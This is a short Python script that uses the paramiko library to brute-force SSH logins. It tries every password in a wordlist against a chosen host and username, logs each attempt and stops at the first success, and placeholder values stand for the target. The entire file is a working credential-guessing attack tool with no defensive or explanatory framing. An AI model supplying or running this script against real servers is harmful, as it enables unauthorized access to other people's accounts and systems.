import paramiko
import sys
import os

# Function to attempt SSH login
def ssh_connect(password, username, host):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22, username=username, password=password)
        print(f"[+] Success: Password found - {password}")
        return True
    except paramiko.AuthenticationException:
        print(f"[-] Failed: {password}")
        return False
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        ssh.close()

# Main function for brute-forcing SSH login
def brute_force_ssh(host, username, wordlist_file):
    if not os.path.exists(wordlist_file):
        print(f"[!] Wordlist file '{wordlist_file}' not found!")
        sys.exit(1)

    print(f"[*] Starting brute-force attack on {host} with username '{username}'")

    with open(wordlist_file, 'r') as wordlist:
        for password in wordlist:
            password = password.strip()
            if ssh_connect(password, username, host):
                print(f"[+] Password found: {password}")
                break
        else:
            print("[*] No valid password found.")

if __name__ == "__main__":
    # Modify these with appropriate values
    host = "Change me"    # SSH server IP address or hostname
    username = "Change me"        # Username for SSH login
    wordlist_file = "wordlist"  # Path to your wordlist file

    brute_force_ssh(host, username, wordlist_file)
